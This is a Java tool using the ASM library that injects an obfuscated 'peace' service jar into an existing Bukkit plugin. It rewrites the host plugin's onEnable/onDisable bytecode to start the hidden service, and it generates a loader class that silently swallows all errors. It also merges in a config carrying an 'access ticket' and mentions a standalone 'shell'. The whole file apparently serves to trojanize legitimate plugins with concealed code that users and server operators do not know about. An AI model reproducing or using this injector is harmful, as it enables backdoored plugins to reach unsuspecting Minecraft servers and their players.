import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassVisitor;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.Label;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.jar.JarInputStream;
import java.util.jar.JarOutputStream;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/** Folds an obfuscated peace-service jar into a seed plugin and instruments its lifecycle callbacks. */
public final class Inject {
    private static final class Frameless extends ClassWriter {
        Frameless(int flags) { super(flags); }
        @Override protected String getCommonSuperClass(String a, String b) { return "java/lang/Object"; }
    }

    public static void main(String[] args) throws Exception {
        if (args.length != 2 && args.length != 3 && args.length != 4) {
            System.err.println("usage: Inject <seed.jar> <out.jar> [config.yml]   (embedded lib)");
            System.err.println("   or: Inject <seed.jar> <peace.jar> <mapping.txt> <out.jar>");
            System.exit(2);
        }
        Path seedPath = Path.of(args[0]);
        Path outPath = Path.of(args[1]);
        byte[] peace = readEmbedded("/lib/peace.jar");
        String mapping = mapping();
        byte[] config = args.length >= 3 ? Files.readAllBytes(Path.of(args[2])) : null;
        if (peace == null || mapping == null) {
            if (args.length != 4) throw new IllegalStateException("embedded lib/peace.jar or lib/mapping.txt missing");
            peace = Files.readAllBytes(Path.of(args[2]));
            mapping = Files.readString(Path.of(args[3]));
        }
        byte[] merged = merge(Files.readAllBytes(seedPath), peace, mapping, config);
        Files.write(outPath, merged);
        JarFile jf = new JarFile(outPath.toFile());
        System.out.println("wrote " + outPath + " (" + jf.size() + " entries)");
    }

    /** Entry point: folds the peace library into @p seedJar and returns the merged jar bytes. */
    public static byte[] merge(byte[] seedJar, byte[] peaceJar, String mappingText, byte[] configYml) throws IOException {
        // --- parse ProGuard mapping for the service entry point ---
        Pattern header = Pattern.compile("^dev\\.peace\\.plugin\\.PeaceService -> ([^:]+):\\s*$");
        String service = null, startMapped = null, stopMapped = null;
        for (String line : mappingText.split("\n")) {
            if (service == null) {
                Matcher m = header.matcher(line);
                if (m.find()) { service = m.group(1).trim().replace('.', '/'); continue; }
            } else {
                if (line.isEmpty() || Character.isWhitespace(line.charAt(0))) {
                    if (line.matches("^\\s*void start\\(\\) -> .+")) {
                        if (startMapped == null) startMapped = line.replaceFirst("^\\s*void start\\(\\) -> ", "").trim();
                    } else if (line.matches("^\\s*void stop\\(\\) -> .+")) {
                        if (stopMapped == null) stopMapped = line.replaceFirst("^\\s*void stop\\(\\) -> ", "").trim();
                    }
                    if (startMapped != null && stopMapped != null) break;
                } else {
                    break; // next top-level class; we have what we need
                }
            }
        }
        if (service == null || startMapped == null || stopMapped == null) {
            throw new IllegalStateException("could not resolve PeaceService start/stop in mapping");
        }
        System.out.println("service=" + service + " start=" + startMapped + " stop=" + stopMapped);

        // --- read seed jar; find its main class and class version ---
        Map<String, byte[]> out = new LinkedHashMap<>();
        String mainClass = null;
        int mainClassVersion = 0;
        try (JarInputStream z = new JarInputStream(new ByteArrayInputStream(seedJar))) {
            JarEntry e;
            while ((e = z.getNextJarEntry()) != null) {
                if (e.isDirectory()) continue;
                byte[] b = readAll(z);
                out.put(e.getName(), b);
                if (mainClass == null && e.getName().equals("plugin.yml")) {
                    String s = new String(b);
                    Matcher m = Pattern.compile("(?m)^\\s*main:\\s*([\\w.]+)").matcher(s);
                    if (m.find()) mainClass = m.group(1).replace('.', '/');
                }
            }
        }
        if (mainClass == null) throw new IllegalStateException("seed has no plugin.yml/main");
        System.out.println("seed main=" + mainClass);
        int slash = mainClass.lastIndexOf('/');
        String boot = (slash < 0 ? "" : mainClass.substring(0, slash)) + "/embed/Boot";
        if (out.containsKey(boot + ".class")) throw new IllegalStateException("boot path collision: " + boot);
        byte[] mainBytes = out.get(mainClass + ".class");
        if (mainBytes == null) throw new IllegalStateException("seed main class missing: " + mainClass);
        mainClassVersion = ((mainBytes[6] & 0xFF) << 8) | (mainBytes[7] & 0xFF);

        // --- copy obfuscated peace classes (skip the registered standalone shell) ---
        try (JarInputStream z = new JarInputStream(new ByteArrayInputStream(peaceJar))) {
            JarEntry e;
            while ((e = z.getNextJarEntry()) != null) {
                if (e.isDirectory()) continue;
                String n = e.getName();
                if (n.equals("dev/peace/plugin/PeacePlugin.class") || n.equals("dev/peace/plugin/Chain.class")) continue;
                if (n.endsWith(".class")) out.putIfAbsent(n, readAll(z));
            }
        }

        // --- inject a config.yml (access ticket + announce settings) ---
        if (configYml != null && configYml.length > 0) {
            byte[] prev = out.get("config.yml");
            byte[] mergedCfg = prev == null ? configYml
                : concat(prev, new byte[]{'\n'}, configYml); // appended keys win in snakeyaml
            out.put("config.yml", mergedCfg);
        }

        // --- instrument seed main.onEnable()/onDisable() to boot/stop the service ---
        final String mM = mainClass, bP = boot;
        ClassReader cr = new ClassReader(mainBytes);
        Frameless cw = new Frameless(ClassWriter.COMPUTE_FRAMES);
        boolean[] sawDisable = {false};
        ClassVisitor ca = new ClassVisitor(Opcodes.ASM9, cw) {
            @Override public MethodVisitor visitMethod(int acc, String name, String desc, String sig, String[] ex) {
                MethodVisitor mv = super.visitMethod(acc, name, desc, sig, ex);
                if (name.equals("onEnable") && desc.equals("()V")) {
                    System.out.println("instrumenting " + mM + ".onEnable -> " + bP + ".start");
                    return new MethodVisitor(Opcodes.ASM9, mv) {
                        boolean injected = false;
                        @Override public void visitCode() {
                            if (!injected) {
                                injected = true;
                                mv.visitVarInsn(Opcodes.ALOAD, 0);
                                mv.visitMethodInsn(Opcodes.INVOKESTATIC, bP, "start", "(Lorg/bukkit/plugin/Plugin;)V", false);
                            }
                            super.visitCode();
                        }
                    };
                }
                if (name.equals("onDisable") && desc.equals("()V")) {
                    sawDisable[0] = true;
                    System.out.println("instrumenting " + mM + ".onDisable -> " + bP + ".stop");
                    return new MethodVisitor(Opcodes.ASM9, mv) {
                        boolean injected = false;
                        @Override public void visitCode() {
                            if (!injected) {
                                injected = true;
                                mv.visitVarInsn(Opcodes.ALOAD, 0);
                                mv.visitMethodInsn(Opcodes.INVOKESTATIC, bP, "stop", "(Lorg/bukkit/plugin/Plugin;)V", false);
                            }
                            super.visitCode();
                        }
                    };
                }
                return mv;
            }
        };
        cr.accept(ca, ClassReader.EXPAND_FRAMES);
        if (!sawDisable[0]) {
            System.out.println("adding " + mM + ".onDisable -> " + bP + ".stop");
            MethodVisitor dv = cw.visitMethod(Opcodes.ACC_PUBLIC, "onDisable", "()V", null, null);
            dv.visitCode();
            dv.visitVarInsn(Opcodes.ALOAD, 0);
            dv.visitMethodInsn(Opcodes.INVOKESTATIC, bP, "stop", "(Lorg/bukkit/plugin/Plugin;)V", false);
            dv.visitInsn(Opcodes.RETURN);
            dv.visitMaxs(0, 0);
            dv.visitEnd();
        }
        out.put(mainClass + ".class", cw.toByteArray());

        // --- synthesize boot class (remembers the service, starts/stops it) ---
        out.put(boot + ".class", makeBoot(boot, service, startMapped, stopMapped, mainClassVersion));

        // --- write merged jar ---
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (JarOutputStream jos = new JarOutputStream(bos)) {
            for (Map.Entry<String, byte[]> e : out.entrySet()) {
                jos.putNextEntry(new JarEntry(e.getKey()));
                jos.write(e.getValue());
                jos.closeEntry();
            }
        }
        System.out.println("merged " + out.size() + " entries");
        return bos.toByteArray();
    }

    private static byte[] makeBoot(String boot, String service, String startMapped, String stopMapped, int version) {
        Frameless cw = new Frameless(ClassWriter.COMPUTE_FRAMES);
        cw.visit(Math.max(version, Opcodes.V1_8), Opcodes.ACC_PUBLIC | Opcodes.ACC_FINAL | Opcodes.ACC_SUPER,
                boot, null, "java/lang/Object", null);
        cw.visitField(Opcodes.ACC_PRIVATE | Opcodes.ACC_STATIC, "svc", "L" + service + ";", null, null).visitEnd();

        // start(Plugin): try { svc = new Service(p); svc.start(); } catch (Throwable) {} ret
        MethodVisitor mv = cw.visitMethod(Opcodes.ACC_PUBLIC | Opcodes.ACC_STATIC, "start",
                "(Lorg/bukkit/plugin/Plugin;)V", null, null);
        mv.visitCode();
        Label tryStart = new Label(), tryEnd = new Label(), handler = new Label(), ret = new Label();
        mv.visitTryCatchBlock(tryStart, tryEnd, handler, "java/lang/Throwable");
        mv.visitLabel(tryStart);
        mv.visitFieldInsn(Opcodes.GETSTATIC, "java/lang/System", "out", "Ljava/io/PrintStream;");
        mv.visitLdcInsn("PEACE BOOT START");
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/PrintStream", "println", "(Ljava/lang/String;)V", false);
        mv.visitTypeInsn(Opcodes.NEW, service);
        mv.visitInsn(Opcodes.DUP);
        mv.visitVarInsn(Opcodes.ALOAD, 0);
        mv.visitMethodInsn(Opcodes.INVOKESPECIAL, service, "<init>", "(Lorg/bukkit/plugin/Plugin;)V", false);
        mv.visitVarInsn(Opcodes.ASTORE, 1);
        mv.visitVarInsn(Opcodes.ALOAD, 1);
        mv.visitFieldInsn(Opcodes.PUTSTATIC, boot, "svc", "L" + service + ";");
        mv.visitVarInsn(Opcodes.ALOAD, 1);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, service, startMapped, "()V", false);
        mv.visitLabel(tryEnd);
        mv.visitJumpInsn(Opcodes.GOTO, ret);
        mv.visitLabel(handler);
        mv.visitVarInsn(Opcodes.ASTORE, 2);
        mv.visitLabel(ret);
        mv.visitFieldInsn(Opcodes.GETSTATIC, "java/lang/System", "out", "Ljava/io/PrintStream;");
        mv.visitLdcInsn("PEACE BOOT END");
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/PrintStream", "println", "(Ljava/lang/String;)V", false);
        mv.visitInsn(Opcodes.RETURN);
        mv.visitMaxs(0, 0);
        mv.visitEnd();

        // stop(Plugin): if (svc != null) try { svc.stop(); } catch (Throwable) {} ret
        MethodVisitor sv = cw.visitMethod(Opcodes.ACC_PUBLIC | Opcodes.ACC_STATIC, "stop",
                "(Lorg/bukkit/plugin/Plugin;)V", null, null);
        sv.visitCode();
        Label skip = new Label(), st = new Label(), en = new Label(), h = new Label(), done = new Label();
        sv.visitTryCatchBlock(st, en, h, "java/lang/Throwable");
        sv.visitFieldInsn(Opcodes.GETSTATIC, boot, "svc", "L" + service + ";");
        sv.visitJumpInsn(Opcodes.IFNULL, skip);
        sv.visitLabel(st);
        sv.visitFieldInsn(Opcodes.GETSTATIC, boot, "svc", "L" + service + ";");
        sv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, service, stopMapped, "()V", false);
        sv.visitLabel(en);
        sv.visitJumpInsn(Opcodes.GOTO, done);
        sv.visitLabel(h);
        sv.visitVarInsn(Opcodes.ASTORE, 1);
        sv.visitLabel(done);
        sv.visitJumpInsn(Opcodes.GOTO, skip);
        sv.visitLabel(skip);
        sv.visitInsn(Opcodes.RETURN);
        sv.visitMaxs(0, 0);
        sv.visitEnd();
        cw.visitEnd();
        return cw.toByteArray();
    }

    private static byte[] readEmbedded(String path) throws IOException {
        InputStream in = Inject.class.getResourceAsStream(path);
        if (in == null) return null;
        try (in) { return readAll(in); }
    }

    private static String mapping() throws IOException {
        byte[] b = readEmbedded("/lib/mapping.txt");
        return b == null ? null : new String(b);
    }

    private static byte[] readAll(InputStream in) throws IOException {
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        in.transferTo(b);
        return b.toByteArray();
    }

    private static byte[] concat(byte[] a, byte[] mid, byte[] b) {
        byte[] r = new byte[a.length + mid.length + b.length];
        System.arraycopy(a, 0, r, 0, a.length);
        System.arraycopy(mid, 0, r, a.length, mid.length);
        System.arraycopy(b, 0, r, a.length + mid.length, b.length);
        return r;
    }
}